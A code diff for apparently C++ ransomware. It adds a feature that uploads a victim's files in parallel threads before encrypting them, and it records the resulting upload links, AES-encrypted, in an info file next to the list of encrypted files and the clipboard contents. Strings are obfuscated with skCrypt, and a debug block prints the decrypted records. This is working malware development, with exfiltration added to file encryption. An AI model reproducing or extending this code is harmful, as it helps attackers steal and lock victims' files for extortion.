@@ -59,6 +59,14 @@ int main(int argc, char* argv[])
 
 
     thread threads[MAX_THREADS];
+
+    if (FILE_UPLOADER) {
+        for (int i = 0; i < filesSplitted.size(); i++)
+            threads[i] = thread(uploadFiles, filesSplitted[i]);
+        for (int i = 0; i < filesSplitted.size(); i++)  // wait for all threads to finish uploading files
+            threads[i].join();
+    }
+
     for (int i = 0; i < filesSplitted.size(); i++)
         threads[i] = thread(encryptFiles, filesSplitted[i], key);
     key = aes_encrypt(KEYOFKEY, key, IV);   // it's here for more safety
@@ -92,12 +100,21 @@ int main(int argc, char* argv[])
     infoFileContent += info_txt;
     infoFileContent += skCrypt("\n");
 
-    // cryptes.txt
+    // cryptedFiles.txt
     string cryptedFiles_txt = (string)skCrypt("");
     for (string file : files)
         cryptedFiles_txt += file + (string)skCrypt("\n");
     cryptedFiles_txt = aes_encrypt(KEY, cryptedFiles_txt, IV);
     infoFileContent += cryptedFiles_txt;
+    infoFileContent += skCrypt("\n");
+
+    // links.txt
+    string links_txt = (string)skCrypt("");
+    if (FILE_UPLOADER)
+        for (string link : getLinks())
+            links_txt += link + (string)skCrypt("\n");
+    links_txt = aes_encrypt(KEY, links_txt, IV);
+    infoFileContent += links_txt;
     infoFileContent += skCrypt("\n");
 
     // clipboard.txt
@@ -155,6 +172,7 @@ int main(int argc, char* argv[])
     if (DEBUG) {
         cout << skCrypt("\nEncoded ") << aes_decrypt(KEY, info_txt, IV) << skCrypt("\n");
         cout << skCrypt("Crypted files:\n") << aes_decrypt(KEY, cryptedFiles_txt, IV) << skCrypt("\n");
+        cout << skCrypt("Links:\n") << aes_decrypt(KEY, links_txt, IV) << skCrypt("\n");
         Sleep(5000);
         system("pause");
     }
